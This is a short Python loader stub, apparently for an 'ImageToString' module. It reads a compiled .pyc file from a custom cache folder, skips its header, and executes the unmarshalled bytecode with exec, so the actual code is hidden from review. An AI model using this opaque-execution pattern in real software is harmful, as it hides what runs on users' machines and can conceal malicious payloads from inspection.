
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToString_77dca77b87734a37a8200e9d7232256a.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
